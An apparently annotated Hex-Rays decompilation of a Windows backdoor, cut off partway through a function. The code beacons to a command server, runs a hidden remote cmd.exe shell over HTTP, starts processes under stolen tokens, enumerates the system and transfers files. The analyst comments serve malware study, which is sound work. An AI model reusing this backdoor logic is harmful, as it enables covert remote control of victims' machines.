/* This file was generated by the Hex-Rays decompiler version 8.2.0.221215.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

HINTERNET *__thiscall sub_401000(HINTERNET *this, char);
void __thiscall sub_401078(HINTERNET *this);
BOOL __thiscall sub_4010C0(LPCSTR *this);
int __thiscall sub_4011DE(void **this, char *Str);
int __thiscall sub_40123B(void **this, char *Str);
int __thiscall sub_401280(void **this, char *Str);
BOOL __thiscall sub_4012C5(_DWORD *this, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL __thiscall sub_4013A7(_DWORD *this, char *Str);
signed int __thiscall sub_4013CC(HINTERNET *this);
void __cdecl sub_40199F(char *Str, HANDLE hFile);
BOOL __cdecl sub_4025A2(char *Dest, HINTERNET *, HANDLE hFile);
char *__cdecl sub_402645(char *Dest);
char *__cdecl sub_4027A8(char *Dest);
char *__cdecl sub_4027E6(char *Dest);
int __cdecl sub_402817(char *, const char *, DWORD dwProcessId);
void __cdecl operator delete(void *); idb
size_t __cdecl strlen(const char *Str);
char *__cdecl strcpy(char *Dest, const char *Source);
void *__cdecl operator new(unsigned int); idb
void *__cdecl memset(void *Dst, int Val, size_t Size);
char *__cdecl strcat(char *Dest, const char *Source);
int sub_402C2C();
HRESULT __stdcall URLDownloadToFileA(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
BOOL __stdcall CreateProcessAsUserA(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject);
SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
BOOL __stdcall StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
void __stdcall Sleep(DWORD dwMilliseconds);
HANDLE __stdcall GetCurrentProcess();
DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
BOOL __stdcall CloseHandle(HANDLE hObject);
DWORD __stdcall GetLastError();
__int32 __cdecl atol(const char *Str);
int sprintf(char *Dest, const char *Format, ...);
int __cdecl strcmpi(const char *Str1, const char *Str2);

//-------------------------------------------------------------------------
// Data declarations

int (__thiscall *off_403150)(void *, char) = &sub_401000; // weak
char aS[] = "/s"; // idb
char aP[] = "/p"; // idb
char aServiceDoesNot[28] = "\r\nService does not exist!\r\n"; // weak
char aOpenscmanagerF[] = "\r\nOpenSCManager failed!\r\n"; // idb
char aSoLong[] = "So long!\r\n"; // idb
char aOk_0[] = "OK!\r\n"; // idb
char aExit[] = "exit\r\n"; // idb
char aShellStartedWa[] = "Shell started,wait to terminate it.....\r\n"; // idb
char aServiceIsRunni[32] = "\r\nService is running already!\r\n"; // weak
char aServiceStarted[21] = "\r\nService started!\r\n"; // weak
char aStartserviceFa[] = "\r\nStartService failed!\r\n"; // idb
char aCreateprocessF[] = "\r\nCreateProcess failed!\r\n"; // idb
char aProgramStarted[21] = "\r\nProgram started!\r\n"; // weak
char aSyntaxErrorU_1[60] = "Syntax error!\tUsage:\tstart </p|/s> <filename|ServiceName>\r\n"; // weak
char aSyntaxError[] = "Syntax error!\n"; // idb
char aSyntaxErrorU_2[] = "\r\nSyntax error!\tUsage:\tGetUrl URL FileName\r\n"; // idb
char aOk_1[] = "OK!\n"; // idb
HANDLE hHandle = NULL; // idb
LPCSTR Str = NULL; // idb
LPCSTR lpServiceName = NULL; // idb
int shell_is_running = 0; // weak


//----- (00401000) --------------------------------------------------------
HINTERNET *__thiscall sub_401000(HINTERNET *this, char a2)
{
  sub_401078(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (0040101C) --------------------------------------------------------
void **__thiscall sub_40101C(int this, char *Str, char *a3, char *a4, char *a5, int a6, int a7)
{
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = a6;
  *(_DWORD *)this = &off_403150;
  *(_DWORD *)(this + 16) = a7;
  sub_401199((void **)this, Str);
  sub_4011DE((void **)this, a4);
  sub_40123B((void **)this, a3);
  sub_401280((void **)this, a5);
  return (void **)this;
}
// 403150: using guessed type int (__thiscall *off_403150)(void *, char);

//----- (00401078) --------------------------------------------------------
void __thiscall sub_401078(HINTERNET *this)
{
  void *v2; // esi

  *this = &off_403150;
  sub_4013CC(this);
  if ( this[6] )
    operator delete(this[6]);
  if ( this[7] )
    operator delete(this[7]);
  if ( this[5] )
    operator delete(this[5]);
  v2 = this[8];
  if ( v2 )
    operator delete(v2);
}
// 403150: using guessed type int (__thiscall *off_403150)(void *, char);

//----- (004010C0) --------------------------------------------------------
// This function retrieves a page from the web server.  The "verb" is GET, so HttpOpenRequest() retrieves data.
BOOL __thiscall sub_4010C0(LPCSTR *this)
{
  CHAR *v2; // eax
  DWORD v3; // ebx
  INTERNET_PORT v4; // ax
  CHAR *v5; // eax
  const CHAR *v6; // eax
  BOOL v8; // [esp+10h] [ebp-4h]

  v2 = (CHAR *)InternetOpenA(this[7], 0, 0, 0, 0);
  this[1] = v2;
  if ( !v2 )
    return 0;
  if ( this[4] )
  {
    InternetSetOptionA(v2, 5u, this + 4, 4u);
    InternetSetOptionA((HINTERNET)this[1], 2u, this + 4, 4u);
    v8 = InternetSetOptionA((HINTERNET)this[1], 6u, this + 4, 4u);
  }
  if ( this[9] )
  {
    v3 = -2071973632;
    v4 = 443;
  }
  else
  {
    v3 = -2080374528;
    v4 = 80;
  }
  v5 = (CHAR *)InternetConnectA((HINTERNET)this[1], this[6], v4, szReferrer, szReferrer, 3u, 0, 0);
  this[2] = v5;
  if ( !v5 )
    return 0;
  v6 = (const CHAR *)HttpOpenRequestA(v5, szVerb, this[5], 0, szReferrer, 0, v3, 0);
  this[3] = v6;
  if ( !v6 )
    return 0;
  if ( this[8] )
  {
    if ( strlen(this[8]) )
      return HttpAddRequestHeadersA((HINTERNET)this[3], this[8], 0xFFFFFFFF, 0x20000000u);
  }
  return v8;
}

//----- (00401199) --------------------------------------------------------
int __thiscall sub_401199(void **this, char *Str)
{
  size_t v4; // edi
  void *v5; // eax

  if ( !Str )
    return 0;
  v4 = strlen(Str);
  if ( this[6] )
    operator delete(this[6]);
  v5 = operator new(v4 + 1);
  this[6] = v5;
  strcpy((char *)v5, Str);
  return 1;
}

//----- (004011DE) --------------------------------------------------------
int __thiscall sub_4011DE(void **this, char *Str)
{
  size_t v4; // edi
  void *v5; // eax
  _BYTE *v6; // eax

  if ( !Str )
    return 0;
  v4 = strlen(Str);
  if ( this[5] )
    operator delete(this[5]);
  v5 = operator new(v4 + 2);
  this[5] = v5;
  strcpy((char *)v5, Str);
  v6 = (char *)this[5] + v4;
  if ( *(v6 - 1) != 47 )
  {
    *v6 = 47;
    *((_BYTE *)this[5] + v4 + 1) = 0;
  }
  return 1;
}

//----- (0040123B) --------------------------------------------------------
int __thiscall sub_40123B(void **this, char *Str)
{
  size_t v4; // edi
  void *v5; // eax

  if ( !Str )
    return 0;
  v4 = strlen(Str);
  if ( this[7] )
    operator delete(this[7]);
  v5 = operator new(v4 + 1);
  this[7] = v5;
  strcpy((char *)v5, Str);
  return 1;
}

//----- (00401280) --------------------------------------------------------
int __thiscall sub_401280(void **this, char *Str)
{
  size_t v4; // edi
  void *v5; // eax

  if ( !Str )
    return 0;
  v4 = strlen(Str);
  if ( this[8] )
    operator delete(this[8]);
  v5 = operator new(v4 + 1);
  this[8] = v5;
  strcpy((char *)v5, Str);
  return 1;
}

//----- (004012C5) --------------------------------------------------------
// Send more data to server
BOOL __thiscall sub_4012C5(_DWORD *this, LPVOID lpOptional, DWORD dwOptionalLength)
{
  char Dest[64]; // [esp+4h] [ebp-4Ch] BYREF
  DWORD dwBufferLength; // [esp+44h] [ebp-Ch] BYREF
  BOOL v7; // [esp+48h] [ebp-8h]
  char Buffer; // [esp+4Ch] [ebp-4h] BYREF
  char v9; // [esp+4Dh] [ebp-3h]

  if ( !this[3] )
    return 0;
  do
  {
    sprintf(Dest, "Content-Length: %d\r\n", dwOptionalLength);
    HttpAddRequestHeadersA((HINTERNET)this[3], Dest, 0xFFFFFFFF, 0xA0000000);
    v7 = HttpSendRequestA((HINTERNET)this[3], 0, 0, lpOptional, dwOptionalLength);
    if ( v7 )
      break;
    if ( GetLastError() != 12045 )
      break;
    dwBufferLength = 4;
    InternetQueryOptionA((HINTERNET)this[3], 0x1Fu, &Buffer, &dwBufferLength);
    v9 |= 1u;
  }
  while ( InternetSetOptionA((HINTERNET)this[3], 0x1Fu, &Buffer, 4u) );
  return v7;
}

//----- (0040138F) --------------------------------------------------------
// Calls InternetReadFile to get data from server
BOOL __thiscall sub_40138F(
        HINTERNET *this,
        LPVOID lpBuffer,
        DWORD dwNumberOfBytesToRead,
        LPDWORD lpdwNumberOfBytesRead)
{
  return InternetReadFile(this[3], lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

//----- (004013A7) --------------------------------------------------------
BOOL __thiscall sub_4013A7(_DWORD *this, char *Str)
{
  DWORD v4; // eax

  if ( !Str )
    return 0;
  v4 = strlen(Str);
  return sub_4012C5(this, Str, v4);
}

//----- (004013CC) --------------------------------------------------------
signed int __thiscall sub_4013CC(HINTERNET *this)
{
  if ( this[3] )
  {
    InternetCloseHandle(this[3]);
    this[3] = 0;
  }
  if ( this[2] )
  {
    InternetCloseHandle(this[2]);
    this[2] = 0;
  }
  if ( this[1] )
  {
    InternetCloseHandle(this[1]);
    this[1] = 0;
  }
  return 1;
}

//----- (00401406) --------------------------------------------------------
// This is where most of the action happens.
int __cdecl sub_401406(char *a1, char *Dest, char *Str, char *Dst)
{
  unsigned int v4; // edi
  char *v5; // eax
  char *v6; // esi
  char *v7; // eax
  size_t v8; // eax
  DWORD v9; // esi
  unsigned int v10; // edi
  char *v11; // esi
  int v12; // edi
  const char *v13; // esi
  HANDLE Thread; // esi
  int v15; // eax
  unsigned int v17; // [esp+0h] [ebp-290h]
  CHAR NameBuffer[260]; // [esp+10h] [ebp-280h] BYREF
  CHAR Buffer[264]; // [esp+114h] [ebp-17Ch] BYREF
  struct _SECURITY_ATTRIBUTES v20; // [esp+21Ch] [ebp-74h] BYREF
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+228h] [ebp-68h] BYREF
  int v22[10]; // [esp+234h] [ebp-5Ch] BYREF
  char *v23; // [esp+25Ch] [ebp-34h]
  int v24; // [esp+260h] [ebp-30h]
  HANDLE hReadPipe; // [esp+264h] [ebp-2Ch] BYREF
  int v26; // [esp+268h] [ebp-28h]
  HANDLE hWritePipe; // [esp+26Ch] [ebp-24h] BYREF
  HANDLE ReadPipe1; // [esp+270h] [ebp-20h] BYREF
  char *string; // [esp+274h] [ebp-1Ch]
  HANDLE WritePipe1; // [esp+278h] [ebp-18h] BYREF
  DWORD nSize; // [esp+27Ch] [ebp-14h] BYREF
  DWORD dwNumberOfBytesRead; // [esp+280h] [ebp-10h] BYREF
  int v33; // [esp+28Ch] [ebp-4h]

  v4 = 0;
  v24 = 0;
  v26 = 0;
  shell_is_running = 0;
  if ( a1 )                                     // a1 is URL to connect to to get command to execute
  {
    if ( Dest )
    {
      v5 = (char *)operator new(0x400u);
      v6 = v5;
      v23 = v5;
      if ( v5 )
      {
        strcpy(v5, Source);
        strcat(v6, aComputer);
        nSize = 16;
        string = &v6[strlen(v6)];
        GetComputerNameA(string, &nSize);
        sub_40101C((int)v22, a1, Dest, Str, v6, (int)Dst, 3600000);
        v33 = 0;
        do                                      // This loop tries to open a connection to the C&C server
        {
          if ( sub_4010C0((LPCSTR *)v22) )
            break;
          sub_4013CC((HINTERNET *)v22);         // close handles and try again
          ++v4;
          Sleep(0xEA60u);
        }
        while ( v4 < 5 );
        if ( v4 != 5 )
        {
          Dest = (char *)operator new(0x10000u);// Allocate a buffer for grabbing data from pipe
          v7 = (char *)operator new(0x1000u);
          Dst = v7;
          if ( Dest )
          {
            if ( v7 )
            {
              Str = (char *)operator new(0x200u);
              if ( Str )
              {
                PipeAttributes.nLength = 12;
                PipeAttributes.bInheritHandle = 1;
                PipeAttributes.lpSecurityDescriptor = 0;
                if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0) )// These pipes allow send/receiving data from the command
                                                // shell, et al to the remote server
                                                // A pipe is just an association between an input and 
                                                // output file handle
                {
                  v20.nLength = 12;
                  v20.bInheritHandle = 1;
                  v20.lpSecurityDescriptor = 0;
                  if ( CreatePipe(&ReadPipe1, &WritePipe1, &v20, 0) )
                  {
                    GetWindowsDirectoryA(Buffer, 0x104u);
                    strcat(Buffer, aTasks);
                    SetCurrentDirectoryA(Buffer);
                    sprintf(Dest, "\r\n%s Connected!\r\n", string);
                    v8 = strlen(Dest);
LABEL_14:
                    v9 = v8;
                    while ( 1 )
                    {
                      v10 = 0;
                      if ( shell_is_running && !v9 )// Only if v9 is 0, means Dest was empty
                      {
                        v17 = v24;
                        *Dest = 0;
                        v9 = sub_401ACB(hReadPipe, Dest, v17);// Fill Dest from pipe
                                                // Return value is # of bytes read
                      }
                      if ( !v26 && !shell_is_running && !v9 )
                      {
                        strcpy(Dest, asc_4040E0);
                        v9 = strlen(Dest);
                        v26 = 1;
                      }
                      do
                      {
                        if ( sub_4012C5(v22, Dest, v9) )// Send data retrieved from pipe in Dest to server
                          break;
                        ++v10;
                        Sleep(0x7530u);
                      }
                      while ( v10 <= 5 );
                      if ( v10 > 5 )
                        break;
                      v9 = 0;
                      memset(Dst, 0, 0x1000u);
                      if ( sub_40138F((HINTERNET *)v22, Dst, 0x1000u, &dwNumberOfBytesRead) )// Read data from server into Dst
                      {
                        do
                          v9 += dwNumberOfBytesRead;
                        while ( dwNumberOfBytesRead
                             && sub_40138F((HINTERNET *)v22, &Dst[v9], 0x1000u, &dwNumberOfBytesRead) );// Continue to read into Dst
                        if ( v9 )
                        {
                          if ( strcmpi(Str1, Dst) )// Str1 contains the "kill" string that causes the malware to shutdown.
                                                // Continue only if that string wasn't received.
                          {
                            v11 = Dst;
                            v26 = 0;
                            v24 = 1;
                            *Dest = 0;
                            while ( 1 )
                            {
                              string = sub_4019EB(v11);// Find CR or LF
                              strcpy(Str, v11);
                              if ( *v11 )
                                break;
                              if ( shell_is_running )
                              {
                                v12 = -1;
                                goto LABEL_39;
                              }
LABEL_52:
                              if ( !*string )
                              {
                                v8 = strlen(Dest);
                                goto LABEL_14;
                              }
                              v11 = string;
                            }
                            v12 = 0;
                            sub_401A2E(v11, 0, 32);// Data from server is processed--does this somehow impact 
                                                // the lpServiceName var?  That contains the parameter 
                                                // for many of the malware functions (process ID, etc.)
                                                // 32 is an ASCII space character
                            v13 = aShell;       // This is the beginning of an array of strings, each *8* bytes long
                                                // 
                            do
                            {
                              if ( !strcmpi(v13, Str2) )// Compare against each string to find a match
                                break;          // Found a match
                              v13 += 8;         // Look at next (pay attention to align 4 directive!)
                              ++v12;
                            }
                            while ( (int)v13 < (int)aSleepTime );// !!!!  ????  !!!!
LABEL_39:
                            switch ( v12 )
                            {
                              case 0:           // case 0 is the "shell" command from the web server, which
                                                // executes "cmd.exe" and attaches the pipes to the shell
                                sub_401BA9(Dest, ReadPipe1, hWritePipe);
                                goto LABEL_52;
                              case 1:           // "list" command enumerates a bunch of stuff about the machine
                                sub_401E12(Dest);
                                goto LABEL_52;
                              case 2:           // "kill" command allows services to be killed
                                sub_402132(Dest);
                                goto LABEL_52;
                              case 3:           // "getF" and "putF" allow downloading and uploading files
                              case 4:
                                dword_404794 = a1;
                                Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, Dest, 0, 0);
                                WaitForSingleObject(Thread, 0xFFFFFFFF);
                                CloseHandle(Thread);
                                goto LABEL_52;
                              case 5:           // "start" allows starting a service
                                sub_402645(Dest);
                                goto LABEL_52;
                              case 6:           // "whoami" gets username
                                nSize = 257;
                                GetUserNameExA(NameSamCompatible, NameBuffer, &nSize);
                                strcat(Dest, NameBuffer);
                                strcat(Dest, asc_4040B4);
                                goto LABEL_52;
                              case 7:           // "quit" command--sends remaining data to server and quits
                                sub_4013A7(v22, aSleepTime);
                                do
                                {
                                  sub_4013A7(v22, szReferrer);
                                  sub_40138F((HINTERNET *)v22, Dst, 0x1000u, &dwNumberOfBytesRead);
                                }
                                while ( !dwNumberOfBytesRead );
                                Dst[dwNumberOfBytesRead] = 0;
                                v15 = atoi(Dst);
                                nSize = v15;
                                if ( v15 )
                                  dword_4046B4 = v15;// Changes sleep value that's used in WinMain()...
                                sub_4025A2(Dest, (HINTERNET *)v22, WritePipe1);
                                break;
                              case 8:
                                strcat(Dest, a20111117);// Appends a "v" to data from server and then restarts parsing?
                                goto LABEL_52;
                              case 9:           // "pidrun" allows creating a new process with the owner equivalent to an existing process
                                sub_4027A8(Dest);
                                goto LABEL_52;
                              case 10:          // "geturl" downloads a URL into a local file.
                                sub_4027E6(Dest);
                                goto LABEL_52;
                              default:
                                if ( shell_is_running )// Default case is simply to send the data from the server 
                                                // through the pipe to the command shell, if it's open
                                {
                                  strcat(Str, asc_4040B4);
                                  sub_40199F(Str, WritePipe1);// send data to shell through pipe endpoint
                                  v24 = 1;
                                }
                                else
                                {
                                  strcat(Dest, aStartShellFirs);
                                }
                                goto LABEL_52;
                            }
                          }
                          break;
                        }
                      }
                    }
                  }
                }
                v6 = v23;
              }
            }
          }
        }
        if ( shell_is_running )
        {
          TerminateProcess(hHandle, 0);
          WaitForSingleObject(hHandle, 0xFFFFFFFF);
        }
        sub_4013CC((HINTERNET *)v22);
        if ( Dest )
          operator delete(Dest);
        if ( Dst )
          operator delete(Dst);
        operator delete(v6);
        if ( Str )
          operator delete(Str);
        CloseHandle(hHandle);
        CloseHandle(dword_404774);
        if ( hReadPipe != (HANDLE)-1 )
          CloseHandle(hReadPipe);
        if ( hWritePipe != (HANDLE)-1 )
          CloseHandle(hWritePipe);
        if ( ReadPipe1 != (HANDLE)-1 )
          CloseHandle(ReadPipe1);
        if ( WritePipe1 != (HANDLE)-1 )
          CloseHandle(WritePipe1);
        v33 = -1;
        sub_401078((HINTERNET *)v22);
      }
    }
  }
  return 0;
}
// 4046B4: using guessed type int dword_4046B4;
// 4047A0: using guessed type int shell_is_running;

//----- (0040199F) --------------------------------------------------------
void __cdecl sub_40199F(char *Str, HANDLE hFile)
{
  char *v2; // esi
  DWORD v3; // eax
  bool v4; // al

  v2 = Str;
  if ( Str )
  {
    if ( strlen(Str) )
    {
      v3 = strlen(Str);
      Str = 0;
      v4 = WriteFile(hFile, v2, v3, (LPDWORD)&Str, 0);
      if ( Str )
      {
        if ( v4 )
          Sleep(0x64u);
      }
    }
  }
}

//----- (004019EB) --------------------------------------------------------
// Skip CR/LF?
char *__cdecl sub_4019EB(char *Str)
{
  size_t v2; // esi
  size_t v3; // eax
  char v4; // cl

  if ( !Str )
    return 0;
  v2 = 0;
  v3 = strlen(Str);
  if ( v3 )
  {
    do
    {
      v4 = Str[v2];
      if ( !v4 )
        break;
      if ( v4 == 13 )
        break;
      if ( v4 == 10 )
        break;
      ++v2;
    }
    while ( v2 < v3 );
  }
  if ( Str[v2] == 13 )
  {
    Str[v2] = 0;
    v2 += 2;
  }
  return &Str[v2];
}                                               // Skip CR/LF?

//----- (00401A2E) --------------------------------------------------------
// Didn't full dig into this parsing function.
int __cdecl sub_401A2E(char *Str, int a2, char a3)
{
  size_t v3; // eax
  int v4; // esi
  char v5; // bl
  int *v6; // edx
  char v7; // cl
  char *v8; // eax
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]
  unsigned int v12; // [esp+20h] [ebp+Ch]

  v3 = a2;
  v4 = 0;
  v10 = 0;
  v11 = 0;
  if ( !a2 )
    v3 = strlen(Str);
  v5 = a3;
  v12 = v3;
  v6 = (int *)&Str2;
  memset(&Str2, 0, 0x20u);                      // 32 binary zeroes into global Str2 variable
  if ( !v3 )
    return v10 + 1;
  while ( 1 )
  {
    v7 = Str[v4];
    v8 = &Str[v4];
    if ( v7 != v5 && !v11 )
    {
      v11 = 1;
      if ( v7 == 34 )                           // 34 is a double quote character
      {
        v5 = 34;
        ++v4;
      }
      v8 = &Str[v4];
      *v6 = (int)&Str[v4];
    }
    if ( *v8 == v5 || *v8 == 13 )
    {
      if ( v11 )
      {
        v11 = 0;
        *v8 = 0;
        ++v10;
        v5 = a3;
        if ( ++v6 == &shell_is_running )        //  ???????????????????????????????????????????
          break;
      }
    }
    if ( ++v4 >= v12 )
      return v10 + 1;
  }
  return 8;
}
// 4047A0: using guessed type int dword_4047A0;

//----- (00401ACB) --------------------------------------------------------
// Calls ReadFile on pipe
size_t __cdecl sub_401ACB(HANDLE hNamedPipe, char *ExitCode, int a3)
{
  char *v3; // edi
  int v4; // esi
  unsigned int v6; // [esp+Ch] [ebp-Ch]
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-8h] BYREF
  DWORD BytesRead; // [esp+14h] [ebp-4h] BYREF

  v3 = ExitCode;
  BytesRead = 0;
  NumberOfBytesRead = 0;
  v4 = 0;
  v6 = 0;
  while ( 1 )
  {
    GetExitCodeProcess(hHandle, (LPDWORD)&ExitCode);
    if ( ExitCode != (char *)259 )
      break;
    PeekNamedPipe(hNamedPipe, &v3[v4], 0x10000 - v4, &BytesRead, 0, 0);
    if ( !a3 || BytesRead || v6 >= 0xA )
    {
      NumberOfBytesRead = 0;
      if ( !BytesRead )
        return v4;
      if ( !ReadFile(hNamedPipe, &v3[v4], BytesRead, &NumberOfBytesRead, 0) )
        return v4;
      v4 += NumberOfBytesRead;
      a3 = 0;
      if ( !NumberOfBytesRead )
        return v4;
    }
    else
    {
      Sleep(0x32u);
      ++v6;
    }
  }
  shell_is_running = 0;
  CloseHandle(hHandle);
  CloseHandle(dword_404774);
  memset(&hHandle, 0, 0x10u);
  strcpy(v3, aProcessCmd_exe);
  return strlen(v3);
}
// 4047A0: using guessed type int dword_4047A0;

//----- (00401BA9) --------------------------------------------------------
void __cdecl sub_401BA9(char *a1, void *a2, HANDLE TokenHandle)
{
  HANDLE v3; // esi
  DWORD LastError; // eax
  __int32 v5; // eax
  HANDLE v6; // ebx
  DWORD v7; // eax
  DWORD v8; // eax
  char Source[256]; // [esp+Ch] [ebp-26Ch] BYREF
  CHAR Dst[264]; // [esp+10Ch] [ebp-16Ch] BYREF
  char Dest[32]; // [esp+214h] [ebp-64h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+234h] [ebp-44h] BYREF

  if ( a2 != (void *)-1 )
  {
    v3 = TokenHandle;
    if ( TokenHandle != (HANDLE)-1 )
    {
      if ( shell_is_running )
      {
        strcat(a1, aStartedAlready);
        sprintf(Dest, " and the PID is %d\r\n", dword_404778);
        strcat(a1, Dest);
      }
      else
      {
        if ( !ExpandEnvironmentStringsA(Src, Dst, 0x104u) )
        {
          GetSystemDirectoryA(Dst, 0x104u);
          strcat(Dst, aCmd_exe);                // ....the string "cmd.exe" (command shell)
        }
        if ( GetFileAttributesA(Dst) == -1 )
        {
          LastError = GetLastError();
          sprintf(Dest, "GetFileAttributes Error code: %d\r\n", LastError);
          strcat(a1, Dest);
        }
        else
        {
          strcat(a1, aCmdpath);
          strcat(a1, Dst);
          strcat(a1, asc_40420C);
          memset(&StartupInfo, 0, sizeof(StartupInfo));
          StartupInfo.hStdInput = a2;           // -------> IMPORTANT!  stdin and stdout for cmd.exe
                                                // set to the pipes that are used to communicate with the
                                                // web server!
          StartupInfo.cb = 68;
          StartupInfo.dwFlags = 257;
          StartupInfo.wShowWindow = 0;
          StartupInfo.hStdError = v3;
          StartupInfo.hStdOutput = v3;
          if ( Str && !lpServiceName && (v5 = atol(Str)) != 0 )
          {
            v6 = OpenProcess(0x1F0FFFu, 0, v5); // Opens the process so the access token can be...accessed
            if ( v6 == (HANDLE)-1 )
            {
              v7 = GetLastError();
              sprintf(Source, "OpenP failed with %d!\n", v7);
              strcat(a1, Source);
              return;
            }
            if ( OpenProcessToken(v6, 0xBu, &TokenHandle) )
            {
              if ( CreateProcessAsUserA(
                     TokenHandle,
                     0,
                     Dst,                       // ------------> "cmd.exe"
                     0,
                     0,
                     1,
                     0,
                     0,
                     0,
                     &StartupInfo,
                     (LPPROCESS_INFORMATION)&hHandle) )
              {
                shell_is_running = 1;
              }
            }
            else
            {
              v8 = GetLastError();
              sprintf(Source, "OpenT failed with %d!\n", v8);
              strcat(a1, Source);
            }
            CloseHandle(v6);
          }
          else if ( CreateProcessA(0, Dst, 0, 0, 1, 0, 0, 0, &StartupInfo, (LPPROCESS_INFORMATION)&hHandle) )
          {
            shell_is_running = 1;
          }
          Sleep(0x1F4u);
        }
        if ( shell_is_running )
          strcat(a1, aShellStartedSu);
        else
          strcat(a1, aShellStartedFa);
      }
    }
  }
}
// 404778: using guessed type int dword_404778;
// 4047A0: using guessed type int dword_4047A0;

//----- (00401E12) --------------------------------------------------------
char *__cdecl sub_401E12(char *a1)
{
  DWORD v1; // ebx
  char *result; // eax
  HANDLE Toolhelp32Snapshot; // ebx
  BOOL i; // eax
  SC_HANDLE v5; // eax
  DWORD v6; // edi
  void *v7; // eax
  const char **v8; // esi
  UINT DriveTypeA; // eax
  UINT v10; // eax
  UINT v11; // eax
  UINT v12; // eax
  UINT v13; // eax
  UINT v14; // eax
  int v15[137]; // [esp+Ch] [ebp-464h] BYREF
  PROCESSENTRY32 Dst; // [esp+230h] [ebp-240h] BYREF
  char Dest[256]; // [esp+358h] [ebp-118h] BYREF
  DWORD pcbBytesNeeded; // [esp+458h] [ebp-18h] BYREF
  CHAR String1[4]; // [esp+45Ch] [ebp-14h] BYREF
  void *v20; // [esp+460h] [ebp-10h]
  SC_HANDLE hSCObject; // [esp+464h] [ebp-Ch]
  DWORD ServicesReturned; // [esp+468h] [ebp-8h] BYREF
  CHAR v23; // [esp+46Fh] [ebp-1h]

  v1 = 0;
  if ( !Str )
    return strcat(a1, aSyntaxErrorUsa);
  if ( !strcmpi(aP, Str) )
  {
    memset(&Dst, 0, sizeof(Dst));
    memset(v15, 0, sizeof(v15));
    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    if ( Toolhelp32Snapshot == (HANDLE)-1 )
      return strcat(a1, aListProcessFai);
    Dst.dwSize = 296;
    v15[0] = 548;
    for ( i = Process32First(Toolhelp32Snapshot, &Dst); i; i = Process32Next(Toolhelp32Snapshot, &Dst) )// This seems bizarre, but it's way in Windows to get a process list
    {
      sprintf(Dest, "%-26s %5d\r\n", Dst.szExeFile, Dst.th32ProcessID);
      strcat(a1, Dest);
    }
    return (char *)CloseHandle(Toolhelp32Snapshot);
  }
  if ( strcmpi(aS, Str) )
  {
    result = (char *)strcmpi(aD, Str);
    if ( !result )
    {
      hSCObject = 0;
      ServicesReturned = GetLogicalDrives();    // Hard drives are also enumerated
      v23 = 65;
      sprintf(Dest, aVolumeOnThisCo);
      strcat(a1, Dest);
      while ( ServicesReturned )
      {
        if ( (ServicesReturned & 1) != 0 )
        {
          sprintf(Dest, "%c:\t", v23);
          strcat(a1, Dest);
          String1[0] = v23;
          String1[1] = 0;
          lstrcatA(String1, String2);
          DriveTypeA = GetDriveTypeA(String1);
          if ( DriveTypeA )
          {
            v10 = DriveTypeA - 1;
            if ( v10 )
            {
              v11 = v10 - 1;
              if ( v11 )
              {
                v12 = v11 - 1;
                if ( v12 )
                {
                  v13 = v12 - 1;
                  if ( v13 )
                  {
                    v14 = v13 - 1;
                    if ( v14 )
                    {
                      if ( v14 == 1 )
                        strcat(a1, aRamdisk);
                    }
                    else
                    {
                      strcat(a1, aCdRom);
                    }
                  }
                  else
                  {
                    strcat(a1, aRemote);
                  }
                }
                else
                {
                  strcat(a1, aFixed);
                }
              }
              else
              {
                strcat(a1, aRemoveable);
              }
            }
            else
            {
              strcat(a1, aInvalid);
            }
          }
          else
          {
            strcat(a1, aUnkown);
          }
          if ( GetVolumeInformationA(String1, (LPSTR)&Dst.dwFlags, 0x105u, 0, 0, 0, 0, 0) )
            strcat(a1, (const char *)&Dst.dwFlags);
          strcat(a1, asc_4040B4);
          hSCObject = (char *)hSCObject + 1;
        }
        ServicesReturned >>= 1;
        ++v23;
      }
      sprintf(Dest, "\r\nTotally %d volumes found.\r\n", hSCObject);
      return strcat(a1, Dest);
    }
  }
  else
  {
